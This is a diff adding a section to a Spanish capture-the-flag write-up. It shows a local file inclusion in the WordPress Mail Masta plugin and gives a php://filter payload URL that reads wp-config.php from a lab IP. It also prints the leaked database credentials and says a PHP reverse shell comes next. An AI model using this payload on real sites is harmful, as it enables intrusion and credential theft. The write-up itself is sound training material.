@@ -72,5 +72,39 @@ Probamos bruteforce al login de wordpress y no obtuvimos nada. Volvemos a lanzar
 
  > *The File Inclusion vulnerability allows an attacker to include a file, usually exploiting a "dynamic file inclusion" mechanisms implemented in the target application. The vulnerability occurs due to the use of user-supplied input without proper validation*
 
+Esta vulnerabilidad ataca al pathing "wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=*file*" a través del parámetro pl.
+Probamos a acceder a /etc/passwd:
+
+![image](https://github.com/user-attachments/assets/19155f1b-5d52-43df-aeae-8c5cb1fa1d3a)
+
+Le pasamos el siguiente payload:
+
+ > http://10.10.96.163/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=/var/www/html/wordpress/wp-config.php
+
+Para obtener el contenido de wp-config en base64. Procedemos a su decodificación:
+
+![image](https://github.com/user-attachments/assets/586fe8d4-717d-44b3-b87b-1ff6bae196d6)
+
+Y vemos las credenciales de acceso a la base de datos:
+
+    /** The name of the database for WordPress */
+    define( 'DB_NAME', 'wordpress' );
+    
+    /** MySQL database username */
+    define( 'DB_USER', 'elyana' );
+    
+    /** MySQL database password */
+    define( 'DB_PASSWORD', 'H@ckme@123' );
+    
+    /** MySQL hostname */
+    define( 'DB_HOST', 'localhost' );
+
+Probamos a utilizar esas credenciales para acceder al panel de Wordpress:
+
+![image](https://github.com/user-attachments/assets/c44e1a6d-853c-4cb6-9f71-cf6f94d68de6)
+
+Con este acceso, ya podemos crear una PHP Reverse Shell en uno de los temas y con ello acceder al sistema:
+
+
 
 # Privilege escalation
